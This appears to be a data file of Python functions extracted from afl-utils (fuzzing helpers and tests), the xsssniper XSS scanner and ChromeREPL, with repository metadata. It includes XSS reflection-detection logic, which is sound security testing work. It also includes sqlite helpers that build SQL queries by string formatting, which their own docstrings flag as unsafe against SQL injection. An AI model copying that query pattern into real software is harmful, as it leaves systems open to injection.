{"docstring": "# If afl -f file switch was used, automatically use correct input\n# file for master instance.\n", "func_signal": "def build_master_cmd(conf_settings, master_index, target_cmd):\n", "code": "if \"%%\" in target_cmd:\n    target_cmd = target_cmd.replace(\"%%\", conf_settings[\"file\"] + \"_%03d\" % master_index)\n# compile command-line for master\n# $ afl-fuzz -i <input_dir> -o <output_dir> -M <session_name>.000 <afl_args> \\\n#   </path/to/target.bin> <target_args>\nmaster_cmd = afl_cmdline_from_config(conf_settings, master_index)\nif \"master_instances\" in conf_settings and conf_settings[\"master_instances\"] > 1:\n    # multi-master mode\n    master_cmd += [\"-M\", \"%s%03d:%d/%d\" % (conf_settings[\"session\"], master_index,\n                                           master_index+1, conf_settings[\"master_instances\"]), \"--\", target_cmd]\nelse:\n    # single-master mode\n    master_cmd += [\"-M\", \"%s000\" % conf_settings[\"session\"], \"--\", target_cmd]\nreturn \" \".join(master_cmd)", "path": "afl_utils\\afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# negative test\n", "func_signal": "def test_get_started_instances(self):\n", "code": "conf_settings = {\n}\ncommand = 'start'\nself.assertEqual(0, afl_multicore.get_started_instance_count(command, conf_settings))\n\n# positive test\nconf_settings = {\n    'session': 'fuzz',\n    'output': 'testdata/sync',\n    'master_instances': 1,\n}\ncommand = 'add'\nself.assertEqual(2, afl_multicore.get_started_instance_count(command, conf_settings))", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "\"\"\"\nInsert a dataset into the database.\n\nDO NOT USE WITH USER SUPPLIED `table` AND `table_spec` PARAMS!\n!!! THIS METHOD IS *NOT* SQLi SAFE !!!\n\n:param table:   Name of the table to insert data into.\n:param dataset: A dataset dict consisting of sample filename, sample classification and classification\n                description.\n:return:        None\n\"\"\"\n# Just a simple function to write the results to the database.\n", "func_signal": "def insert_dataset(self, table, dataset):\n", "code": "if len(dataset) <= 0:\n    return\n\nfield_names_string = \", \".join([\"`{}`\".format(k) for k in dataset.keys()])\nfield_values_string = \", \".join([\"'{}'\".format(v) for v in dataset.values()])\nqstring = \"INSERT INTO {} ({}) VALUES({})\".format(table, field_names_string, field_values_string)\nself.dbcur.execute(qstring)", "path": "db_connectors\\con_sqlite.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "\"\"\"\nCheck if dataset was already submitted into database.\n\nDO NOT USE WITH USER SUPPLIED `table`, `dataset` or `compare_fields` PARAMS!\n!!! THIS METHOD IS *NOT* SQLi SAFE !!!\n\n:param table:           Name of table to perform the check on.\n:param dataset:         A dataset dict consisting of sample filename, sample classification\n                        and classification description.\n:param compare_fields:  List containing field names that will be checked using logical AND operation.\n:return:                True if the data set is already present in database, False otherwise.\n\"\"\"\n# The nice thing about using the SQL DB is that I can just have it make\n# a query to make a duplicate check. This can likely be done better but\n# it's \"good enough\" for now.\n", "func_signal": "def dataset_exists(self, table, dataset, compare_fields):\n", "code": "output = False\n\n# check sample by its name (we could check by hash to avoid dupes in the db)\nsingle_compares = []\nfor compare_field in compare_fields:\n    single_compares.append(\"({} IS '{}')\".format(compare_field, dataset[compare_field]))\n\nqstring = \"SELECT * FROM {} WHERE {}\".format(table, \" AND \".join(single_compares))\nself.dbcur.execute(qstring)\nif self.dbcur.fetchone() is not None:  # We should only have to pull one.\n    output = True\n\nreturn output", "path": "db_connectors\\con_sqlite.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "\"\"\"\nWrite database changes to disk and close cursor and connection.\n\n:return:    None\n\"\"\"\n", "func_signal": "def commit_close(self):\n", "code": "self.dbcon.commit()\nself.dbcur.close()\nself.dbcon.close()", "path": "db_connectors\\con_sqlite.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# positive test\n", "func_signal": "def test_has_master(self):\n", "code": "conf_settings = {\n}\nself.assertTrue(afl_multicore.has_master(conf_settings, 0))\n\nconf_settings = {\n    'session': 'fuzz',\n    'output': 'testdata/sync',\n    'master_instances': 1,\n}\nself.assertTrue(afl_multicore.has_master(conf_settings, 0))\n\nconf_settings = {\n    'session': 'fuzz',\n    'output': 'testdata/sync',\n    'master_instances': 12,\n}\nself.assertTrue(afl_multicore.has_master(conf_settings, 11))\n\n# negative test\nself.assertFalse(afl_multicore.has_master(conf_settings, 12))\n\nconf_settings = {\n    'session': 'fuzz',\n    'output': 'testdata/sync',\n    'master_instances': 0,\n}\nself.assertFalse(afl_multicore.has_master(conf_settings, 0))\nself.assertFalse(afl_multicore.has_master(conf_settings, 2))\n\nconf_settings = {\n    'session': 'fuzz',\n    'output': 'testdata/sync',\n    'master_instances': -23,\n}\nself.assertFalse(afl_multicore.has_master(conf_settings, 0))", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# Use to set up test environment prior to test case\n# invocation\n", "func_signal": "def setUp(self):\n", "code": "os.makedirs('testdata/rsync_tmp_store', exist_ok=True)\nos.makedirs('testdata/sync/fuzz000/crashes', exist_ok=True)\nos.makedirs('testdata/sync/fuzz000/hangs', exist_ok=True)\nos.makedirs('testdata/sync/fuzz000/.cur_input', exist_ok=True)\nos.makedirs('testdata/sync/fuzz001/.cur_input', exist_ok=True)\nos.makedirs('testdata/sync/fuzz002.sync', exist_ok=True)\nos.makedirs('testdata/sync/invalid_fuzz000', exist_ok=True)\nos.makedirs('testdata/sync/invalid_fuzz001', exist_ok=True)\n# push\nos.makedirs('testdata/rsync_output_push', exist_ok=True)\n# pull\nos.makedirs('testdata/rsync_output_pull/fuzz000.sync', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/fuzz001.sync', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/other_fuzz000.sync', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/other_fuzz000.sync/.cur_input', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/other_fuzz000.sync/crashes', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/other_fuzz001.sync', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/other_fuzz001.sync/.cur_input', exist_ok=True)\nos.makedirs('testdata/rsync_output_pull/other_invalid_fuzz000.sync', exist_ok=True)\n# sync\nos.makedirs('testdata/rsync_output_sync/other_fuzz000.sync', exist_ok=True)\nos.makedirs('testdata/rsync_output_sync/other_fuzz001.sync', exist_ok=True)\nos.makedirs('testdata/rsync_output_sync/other_invalid_fuzz000.sync', exist_ok=True)", "path": "tests\\test_afl_sync.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# Use for clean up after tests have run\n", "func_signal": "def tearDown(self):\n", "code": "if os.path.exists('/tmp/afl_multicore.PGID.unittest_sess_01'):\n    os.remove('/tmp/afl_multicore.PGID.unittest_sess_01')\n\nif os.path.exists('testdata/invalid'):\n    os.remove('testdata/invalid')\n\nif os.path.exists('testdata/test_coll/invalid'):\n    os.remove('testdata/test_coll/invalid')\n\nif os.path.exists('testdata/test_coll'):\n    os.rmdir('testdata/test_coll')\n\nif os.path.exists('testdata/vcrash_filelist'):\n    os.remove('testdata/vcrash_filelist')", "path": "tests\\test_afl_vcrash.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# negative test\n", "func_signal": "def test_write_pgid_file(self):\n", "code": "conf_settings = {\n    'session': 'unittest_sess_01',\n    'output': 'testdata/output',\n    'interactive': True\n}\nself.assertIsNone(afl_multicore.write_pgid_file(conf_settings))\nself.assertIsNot(True, os.path.exists('/tmp/afl_multicore.PGID.unittest_sess_01'))\n\n# positive test\nconf_settings = {\n    'session': 'unittest_sess_01',\n    'output': 'testdata/output',\n    'interactive': False\n}\nself.assertIsNone(afl_multicore.write_pgid_file(conf_settings))\nself.assertIs(True, os.path.exists('/tmp/afl_multicore.PGID.unittest_sess_01'))\n\n# positive test, again with implicit non-interactive mode (test for #34)\nconf_settings = {\n    'session': 'unittest_sess_01',\n    'output': 'testdata/output'\n}\nself.assertIsNone(afl_multicore.write_pgid_file(conf_settings))\nself.assertIs(True, os.path.exists('/tmp/afl_multicore.PGID.unittest_sess_01'))", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# fail\n", "func_signal": "def test_remove_samples(self):\n", "code": "samples = ['testdata/invalid']\nwith self.assertRaises(FileNotFoundError):\n    afl_vcrash.remove_samples(samples, False)\n\n# success\nopen('testdata/invalid', 'a').close()\nself.assertEqual(1, afl_vcrash.remove_samples(samples, False))", "path": "tests\\test_afl_vcrash.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# test for invalid crash detection\n", "func_signal": "def test_verify_samples(self):\n", "code": "num_threads = 1\nsamples = ['testdata/sync/fuzz000/fuzzer_stats']    # invalid (non-crashing) sample\ntarget_cmd = 'ls'\ntimeout_secs = 3\n\nself.assertEqual((['testdata/sync/fuzz000/fuzzer_stats'], []),\n                 afl_vcrash.verify_samples(num_threads, samples, target_cmd, timeout_secs))\n\n# test for timeout detection\nnum_threads = 1\nsamples = ['testdata/sync/fuzz000/fuzzer_stats']    # invalid (non-crashing) sample\ntarget_cmd = 'python testdata/dummy_process/dummyproc.py'\ntimeout_secs = 1\n\nself.assertEqual(([], ['testdata/sync/fuzz000/fuzzer_stats']),\n                 afl_vcrash.verify_samples(num_threads, samples, target_cmd, timeout_secs))", "path": "tests\\test_afl_vcrash.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# fail\n", "func_signal": "def test_build_target_cmd(self):\n", "code": "target_cmdline = ['/some/path/to/invalid/target/binary', '--some-opt', '--some-other-opt']\nwith self.assertRaises(SystemExit) as se:\n    afl_vcrash.build_target_cmd(target_cmdline)\nself.assertEqual(2, se.exception.code)\n\ntarget_cmdline = ['testdata/dummy_process/dummyproc.py', '-h', '-l']\nself.assertIn('testdata/dummy_process/dummyproc.py -h -l', afl_vcrash.build_target_cmd(target_cmdline))", "path": "tests\\test_afl_vcrash.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# invalid test\n", "func_signal": "def test_build_target_cmd(self):\n", "code": "conf_settings = {\n    'target': 'testdata/dummy_process/invalid_process',\n    'cmdline': ''\n}\nwith self.assertRaises(SystemExit) as se:\n    afl_multicore.build_target_cmd(conf_settings)\nself.assertEqual(1, se.exception.code)\n\n# valid test\nconf_settings = {\n    'target': '/bin/sh',\n    'cmdline': '--some-opt'\n}\nself.assertEqual('/bin/sh --some-opt', afl_multicore.build_target_cmd(conf_settings))", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# default excludes\n", "func_signal": "def __init__(self, server_config, fuzzer_config):\n", "code": "self.__excludes = ['*.cur_input']\nsuper(AflRsync, self).__init__(server_config, fuzzer_config)", "path": "afl_utils\\afl_sync.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# we're only going to test some error cases\n# invalid invocation (Argparser failure)\n", "func_signal": "def test_main(self):\n", "code": "with self.assertRaises(SystemExit) as se:\n    afl_multicore.main(['afl-multicore', '-c', 'invalid.conf', '--invalid-opt'])\nself.assertEqual(2, se.exception.code)\n\n# test run\nwith self.assertRaises(SystemExit) as se:\n    afl_multicore.main(['afl-multicore', '-c', 'testdata/afl-multicore.conf.test', '-t', 'start', '4'])\nself.assertEqual(1, se.exception.code)\n\n# resume run\nwith self.assertRaises(SystemExit) as se:\n    afl_multicore.main(['afl-multicore', '-c', 'testdata/afl-multicore.conf.test', 'resume', '4'])\nself.assertEqual(1, se.exception.code)", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "\"\"\" Main code of the thread \"\"\"\n", "func_signal": "def run(self):\n", "code": "while True:\n    try:\n        target = self.queue.get(timeout = 1)\n    except:\n        try:\n            self.queue.task_done()\n        except ValueError:\n            pass\n    else:\n        \n        self._parseJavascript(target)\n        self._analyzeJavascript()\n        \n        # Scan complete\n        try:                \n            self.queue.task_done()\n        except ValueError:\n            pass", "path": "core\\domscanner.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"\"Determine console_width.\"\"\"\n\n", "func_signal": "def console_width(kwargs):\n", "code": "if sys.platform.startswith('win'):\n    console_width = _find_windows_console_width()\nelse:\n    console_width = _find_unix_console_width()\n\n_width = kwargs.get('width', None)\nif _width:\n    console_width = _width\nelse:\n    if not console_width:\n        console_width = 80\n\nreturn console_width", "path": "core\\packages\\clint\\textui\\cols.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Returns piped input via stdin, else None.\"\"\"\n", "func_signal": "def piped_in():\n", "code": "with sys.stdin as stdin:\n    # TTY is only way to detect if stdin contains data\n    if not stdin.isatty():\n        return stdin.read()  \n    else:\n        return None", "path": "core\\packages\\clint\\pipes.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Returns given string with right padding.\"\"\"\n\n", "func_signal": "def min_width(string, cols, padding=' '):\n", "code": "is_color = isinstance(string, ColoredString)\n\nstack = tsplit(str(string), NEWLINES)\n\nfor i, substring in enumerate(stack):\n    _sub = clean(substring).ljust((cols + 0), padding)\n    if is_color:\n        _sub = (_sub.replace(clean(substring), substring))\n    stack[i] = _sub\n    \nreturn '\\n'.join(stack)", "path": "core\\packages\\clint\\textui\\formatters.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Progress iterator. Wrap your iterables with it.\"\"\"\n\n", "func_signal": "def bar(it, label='', width=32, hide=False, empty_char=BAR_EMPTY_CHAR, filled_char=BAR_FILLED_CHAR):\n", "code": "def _show(_i):\n    if (time.time() - bar.etadelta) > ETA_INTERVAL:\n        bar.etadelta = time.time()\n        bar.ittimes = bar.ittimes[-ETA_SMA_WINDOW:]+[-(bar.start-time.time())/(_i+1)]\n        bar.eta = sum(bar.ittimes)/float(len(bar.ittimes)) * (count-_i)\n        bar.etadisp = time.strftime('%H:%M:%S', time.gmtime(bar.eta))\n    x = int(width*_i/count)\n    if not hide:\n        STREAM.write(BAR_TEMPLATE % (\n        label, filled_char*x, empty_char*(width-x), _i, count, bar.etadisp))\n        STREAM.flush()\n\ncount = len(it)\n\nbar.start    = time.time()\nbar.ittimes  = []\nbar.eta      = 0\nbar.etadelta = time.time()\nbar.etadisp  = time.strftime('%H:%M:%S', time.gmtime(bar.eta))\n\nif count:\n    _show(0)\n\nfor i, item in enumerate(it):\n\n    yield item\n    _show(i+1)\n\nif not hide:\n    STREAM.write('\\n')\n    STREAM.flush()", "path": "core\\packages\\clint\\textui\\progress.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Disables colors.\"\"\"\n", "func_signal": "def disable():\n", "code": "global DISABLE_COLOR\n\nDISABLE_COLOR = True", "path": "core\\packages\\clint\\textui\\colored.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Emulates `mkdir -p` behavior.\"\"\"\n", "func_signal": "def mkdir_p(path):\n", "code": "try:\n    makedirs(path)\nexcept OSError as exc: # Python >2.5\n    if exc.errno == errno.EEXIST:\n        pass\n    else:\n        raise", "path": "core\\packages\\clint\\utils.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Returns a freshly formatted \"\"\"\n\n", "func_signal": "def max_width(string, cols, separator='\\n'):\n", "code": "is_color = isinstance(string, ColoredString)\n\nif is_color:\n    offset = 10\n    string_copy = string._new('')\nelse:\n    offset = 0\n    \nstack = tsplit(string, NEWLINES)\n\nfor i, substring in enumerate(stack):\n    stack[i] = substring.split()\n\n_stack = []\n\nfor row in stack:\n    _row = ['',]\n    _row_i = 0\n\n    for word in row:\n        if (len(_row[_row_i]) + len(word)) < (cols + offset):\n            _row[_row_i] += word\n            _row[_row_i] += ' '\n            \n        elif len(word) > (cols - offset):\n\n            # ensure empty row\n            if len(_row[_row_i]):\n                _row.append('')\n                _row_i += 1\n\n            chunks = schunk(word, (cols + offset))\n            for i, chunk in enumerate(chunks):\n                if not (i + 1) == len(chunks):\n                    _row[_row_i] += chunk\n                    _row.append('')\n                    _row_i += 1\n                else:\n                    _row[_row_i] += chunk\n                    _row[_row_i] += ' '\n        else:\n            _row.append('')\n            _row_i += 1\n            _row[_row_i] += word\n            _row[_row_i] += ' '\n\n    _row = map(str, _row)\n    _stack.append(separator.join(_row))\n\n_s = '\\n'.join(_stack)\nif is_color:\n    _s = string_copy._new(_s)\nreturn _s", "path": "core\\packages\\clint\\textui\\formatters.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Expands directories and globs in given path.\"\"\"\n\n", "func_signal": "def expand_path(path):\n", "code": "paths = []\npath = os.path.expanduser(path)\npath = os.path.expandvars(path)\n\nif os.path.isdir(path):\n\n    for (dir, dirs, files) in os.walk(path):\n        for file in files:\n            paths.append(os.path.join(dir, file))\nelse:\n    paths.extend(glob(path))\n\nreturn paths", "path": "core\\packages\\clint\\utils.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Splits string into n sized chunks.\"\"\"\n\n", "func_signal": "def schunk(string, size):\n", "code": "stack = []\n\nsubstack = []\ncurrent_count = 0\n\nfor char in string:\n    if not current_count < size:\n        stack.append(''.join(substack))\n        substack = []\n        current_count = 0\n\n    substack.append(char)\n    current_count += 1\n\nif len(substack):\n    stack.append(''.join(substack))\n\nreturn stack", "path": "core\\packages\\clint\\utils.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "''' FillConsoleOutputAttribute( hConsole, csbi.wAttributes, dwConSize, coordScreen, &cCharsWritten )'''\n", "func_signal": "def FillConsoleOutputAttribute(stream_id, attr, length, start):\n", "code": "handle = handles[stream_id]\nattribute = WORD(attr)\nlength = DWORD(length)\nnum_written = DWORD(0)\n# Note that this is hard-coded for ANSI (vs wide) bytes.\nsuccess = windll.kernel32.FillConsoleOutputAttribute(\n    handle, attribute, length, start, byref(num_written))\nreturn success", "path": "core\\packages\\clint\\packages\\colorama\\win32.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Joins lists of words. Oxford comma and all.\"\"\"\n\n", "func_signal": "def join(l, conj=CONJUNCTION, im_a_moron=MORON_MODE, seperator=COMMA):\n", "code": "collector = []\nleft = len(l)\nseperator = seperator + SPACE\nconj = conj + SPACE\n\nfor _l in l[:]:\n\n    left += -1\n\n    collector.append(_l)\n    if left == 1:\n        if len(l) == 2 or im_a_moron:\n            collector.append(SPACE)\n        else:\n            collector.append(seperator)\n\n        collector.append(conj)\n\n    elif left is not 0:\n        collector.append(seperator)\n\nreturn unicode(str().join(collector))", "path": "core\\packages\\clint\\eng.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "# http://code.activestate.com/recipes/440694/\n", "func_signal": "def _find_windows_console_width():\n", "code": "from ctypes import windll, create_string_buffer\nSTDIN, STDOUT, STDERR = -10, -11, -12\n\nh = windll.kernel32.GetStdHandle(STDERR)\ncsbi = create_string_buffer(22)\nres = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)\n\nif res:\n    import struct\n    (bufx, bufy, curx, cury, wattr,\n     left, top, right, bottom,\n     maxx, maxy) = struct.unpack(\"hhhhHhhhhhh\", csbi.raw)\n    sizex = right - left + 1\n    sizey = bottom - top + 1\n    return sizex", "path": "core\\packages\\clint\\textui\\cols.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Progress iterator. Prints a dot for each item being iterated\"\"\"\n\n", "func_signal": "def dots(it, label='', hide=False):\n", "code": "count = 0\n\nif not hide:\n    STREAM.write(label)\n\nfor item in it:\n    if not hide:\n        STREAM.write(DOTS_CHAR)\n        sys.stderr.flush()\n\n    count += 1\n\n    yield item\n\nSTREAM.write('\\n')\nSTREAM.flush()", "path": "core\\packages\\clint\\textui\\progress.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Tests if an object is a collection. Strings don't count.\"\"\"\n\n", "func_signal": "def is_collection(obj):\n", "code": "if isinstance(obj, basestring):\n    return False\n\nreturn hasattr(obj, '__getitem__')", "path": "core\\packages\\clint\\utils.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"Behaves str.split but supports tuples of delimiters.\"\"\"\n\n", "func_signal": "def tsplit(string, delimiters):\n", "code": "delimiters = tuple(delimiters)\nstack = [string,]\n\nfor delimiter in delimiters:\n    for i, substring in enumerate(stack):\n        substack = substring.split(delimiter)\n        stack.pop(i)\n        for j, _substring in enumerate(substack):\n            stack.insert(i+j, _substring)\n\nreturn stack", "path": "core\\packages\\clint\\utils.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "# 0 (or None) should clear from the cursor to the end of the screen.\n# 1 should clear from the cursor to the beginning of the screen.\n# 2 should clear the entire screen. (And maybe move cursor to (1,1)?)\n#\n# At the moment, I only support mode 2. From looking at the API, it \n#    should be possible to calculate a different number of bytes to clear, \n#    and to do so relative to the cursor position.\n", "func_signal": "def erase_data(self, mode=0, on_stderr=False):\n", "code": "if mode[0] not in (2,):\n    return\nhandle = win32.STDOUT\nif on_stderr:\n    handle = win32.STDERR\n# here's where we'll home the cursor\ncoord_screen = win32.COORD(0,0) \ncsbi = win32.GetConsoleScreenBufferInfo(handle)\n# get the number of character cells in the current buffer\ndw_con_size = csbi.dwSize.X * csbi.dwSize.Y\n# fill the entire screen with blanks\nwin32.FillConsoleOutputCharacter(handle, ord(' '), dw_con_size, coord_screen)\n# now set the buffer's attributes accordingly\nwin32.FillConsoleOutputAttribute(handle, self.get_attrs(), dw_con_size, coord_screen );\n# put the cursor at (0, 0)\nwin32.SetConsoleCursorPosition(handle, (coord_screen.X, coord_screen.Y))", "path": "core\\packages\\clint\\packages\\colorama\\winterm.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\" Main code of the thread \"\"\"\n", "func_signal": "def run(self):\n", "code": "while True:\n    try:\n        target = self.queue.get(timeout = 1)\n    except:\n        try:\n            self.queue.task_done()\n        except ValueError:\n            pass\n    else:\n        # No GET/POST parameters? Skip to next url \n        if len(target.params) == 0:\n            # print \"[X] No paramaters to inject\"\n            self.queue.task_done()\n            continue\n       \n        self._performInjections(target)\n        self._checkStoredInjections()\n                        \n        # Scan complete\n        try:                \n            self.queue.task_done()\n        except ValueError:\n            pass", "path": "core\\scanner.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"\nGiven a response object it search and return XSS injection.\n\nHow it works: we parse the response sequentially\nlooking for the seed while keeping\na state of the current position to determine if we have\na valid injection and where.\n\nThis is based on ratproxy XSS scanning technique so\nall the props to @lcamtuf for this.\n\"\"\"\n\n# It only works for payloads of type taint (temporary)\n", "func_signal": "def processResponse(self, response, payload):\n", "code": "if payload.taint:\n    htmlstate = 0\n    htmlurl = 0\n    index = 0\n    result = []\n\n    # Building the taint and the response\n    # I want everything lowercase because I don't want to handle \n    # cases when the payload is upper/lowercased by the webserver\n    seed_len = payload.seed_len\n    seed = payload.seed\n\n    # htmlstate legend:\n    # - 1 index is in tag\n    # - 2 index is inside double quotes\n    # - 4 index is inside single quotes\n    # - 8 index is inside html comment\n    # - 16 index is inside cdata\n    while index <= len(response)-1:\n        # Exit cases for a match against the taint\n        # If conditions are a little messy...\n        # TODO: utf-7 xss\n        if response[index:index+seed_len] == seed:\n            # XSS found in tag\n            # <tag foo=bar onload=...>\n            # type 1\n            if htmlstate == 1 and response[index+seed_len:index+seed_len+seed_len+1] == \" \" + seed + \"=\":\n                index = index + seed_len\n                result.append([1, \"Payload found inside tag\"])\n                continue\n\n            # XSS found in url\n            # <tag src=foo:bar ...>\n            # type 2\n            if htmlurl and response[index+seed_len:index+seed_len+seed_len+1] == \":\" + seed:\n                index = index + seed_len\n                result.append([2, \"Payload found inside url tag\"])\n                continue\n\n            # XSS found freely in response\n            # <tag><script>...\n            # type 3\n            if htmlstate == 0 and response[index+seed_len:index+seed_len+seed_len+1] == \"<\" + seed:\n                index  = index + seed_len\n                result.append([3, \"Payload found free in html\"])\n                continue\n\n            # XSS found inside double quotes\n            # <tag foo=\"bar\"onload=...>\n            # type 4\n            if (htmlstate == 1 or htmlstate == 2) and response[index+seed_len:index+seed_len+seed_len] == \"\\\"\" + seed:\n                index = index + seed_len\n                result.append([4, \"Payload found inside tag escaped from double quotes\"])\n                continue\n\n            # XSS found inside single quotes\n            # <tag foo='bar'onload=...>\n            # type 5\n            if (htmlstate == 1 or htmlstate == 4) and response[index+seed_len:index+seed_len+seed_len] == \"'\" + seed:\n                index  = index + seed_len\n                result.append([5, \"Payload found inside tag escaped from single quotes\"])\n                continue\n\n        else:\n            # We are in a CDATA block\n            if htmlstate == 0 and response[index:index+9] == \"<![CDATA[\":\n                htmlstate = 16\n                index = index + 9\n                continue\n\n            if htmlstate == 16 and response[index:index+3] == \"]]>\":\n                htmlstate = 0\n                index = index + 3\n                continue\n\n            # We are in a html comment\n            if htmlstate == 0 and response[index:index+4] == \"<!--\":\n                htmlstate = 8\n                index = index + 4\n                continue\n\n            if htmlstate == 8 and response[index:index+3] == \"-->\":\n                htmlstate = 0\n                index = index + 3\n                continue\n\n            # We are in a tag\n            if htmlstate == 0 and response[index] == \"<\" and (response[index+1] == \"!\" or response[index+1] == \"?\" or response[index+1].isalpha()):\n                htmlstate = 1\n                index = index + 1\n                continue\n\n            if htmlstate == 1 and response[index] == \">\":\n                htmlstate = 0\n                htmlurl = 0\n                index = index + 1\n                continue\n\n            # We are inside a double quote\n            if htmlstate == 1 and response[index] == '\"' and response[index-1] == '=':\n                htmlstate = 2\n                index = index + 1\n                continue\n\n            if (htmlstate == 1 or htmlstate == 2) and response[index] == '\"':\n                htmlstate = 1\n                index = index + 1\n                continue\n\n            # We are inside a single quote\n            if htmlstate == 1 and response[index] == '\\'' and response[index-1] == '=':\n                htmlstate = 4\n                index = index + 1\n                continue\n\n            if (htmlstate == 1 or htmlstate == 4) and response[index] == '\\'':\n                htmlstate = 1\n                index = index + 1\n                continue\n\n            # We are inside an url\n            if htmlstate == 1 and response[index-1] == \" \" and response[index:index+5] == \"href=\":\n                htmlurl = 1\n                index = index + 5 \n                continue\n\n            if htmlstate == 1 and response[index-1] == \" \" and response[index:index+5] == \"src=\":\n                htmlurl = 1\n                index = index + 4\n                continue\n\n            # In case the url isn't correctly closed\n            if htmlurl == 1: \n                htmlurl = 0\n\n        # Move on\n        index = index +1\n\n    # End of response parsing\n    return result\n\nelse:\n    # No a taint payload\n    return None", "path": "core\\scanner.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "\"\"\"This is a fallback technique at best. I'm not sure if using the\nregistry for this guarantees us the correct answer for all CSIDL_*\nnames.\n\"\"\"\n", "func_signal": "def _get_win_folder_from_registry(csidl_name):\n", "code": "import _winreg\n\nshell_folder_name = {\n    \"CSIDL_APPDATA\": \"AppData\",\n    \"CSIDL_COMMON_APPDATA\": \"Common AppData\",\n    \"CSIDL_LOCAL_APPDATA\": \"Local AppData\",\n}[csidl_name]\n\nkey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,\n    r\"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\")\ndir, type = _winreg.QueryValueEx(key, shell_folder_name)\nreturn dir", "path": "core\\packages\\clint\\packages\\appdirs.py", "repo_name": "gbrindisi/xsssniper", "stars": 387, "license": "None", "language": "python", "size": 210}
{"docstring": "# IPv6 address\n", "func_signal": "def _pack_hostname(hostname):\n", "code": "if ':' in hostname:\n    return '[' + hostname + ']'\n\nreturn hostname", "path": "libs\\websocket\\_handshake.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Remove item from six.moves.\"\"\"\n", "func_signal": "def remove_move(name):\n", "code": "try:\n    delattr(_MovedItems, name)\nexcept AttributeError:\n    try:\n        del moves.__dict__[name]\n    except KeyError:\n        raise AttributeError(\"no such move, %r\" % (name,))", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
